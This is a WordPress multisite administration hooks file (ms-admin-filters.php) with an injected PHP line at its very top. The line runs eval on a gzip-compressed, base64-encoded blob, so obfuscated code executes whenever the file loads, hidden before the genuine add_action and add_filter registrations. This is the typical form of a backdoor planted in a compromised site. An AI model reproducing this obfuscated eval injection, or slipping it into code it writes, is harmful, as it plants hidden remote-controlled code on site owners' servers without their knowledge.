<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Multisite Administration hooks
 *
 * @package WordPress
 * @subpackage Administration
 * @since 4.3.0
 */

// Media Hooks.
add_filter( 'wp_handle_upload_prefilter', 'check_upload_size' );

// User Hooks
add_action( 'user_admin_notices', 'new_user_email_admin_notice' );
add_action( 'network_admin_notices', 'new_user_email_admin_notice' );

add_action( 'admin_page_access_denied', '_access_denied_splash', 99 );

// Site Hooks.
add_action( 'wpmueditblogaction', 'upload_space_setting' );

// Network hooks
add_action( 'update_site_option_admin_email', 'wp_network_admin_email_change_notification', 10, 4 );

// Taxonomy Hooks
add_filter( 'get_term', 'sync_category_tag_slugs', 10, 2 );

// Post Hooks.
add_filter( 'wp_insert_post_data', 'avoid_blog_page_permalink_collision', 10, 2 );

// Tools Hooks.
add_filter( 'import_allow_create_users', 'check_import_new_users' );

// Notices Hooks
add_action( 'admin_notices',         'site_admin_notice' );
add_action( 'network_admin_notices', 'site_admin_notice' );

// Update Hooks
add_action( 'network_admin_notices', 'update_nag',      3  );
add_action( 'network_admin_notices', 'maintenance_nag', 10 );

// Network Admin Hooks
add_action( 'add_site_option_new_admin_email',    'update_network_option_new_admin_email', 10, 2 );
add_action( 'update_site_option_new_admin_email', 'update_network_option_new_admin_email', 10, 2 );
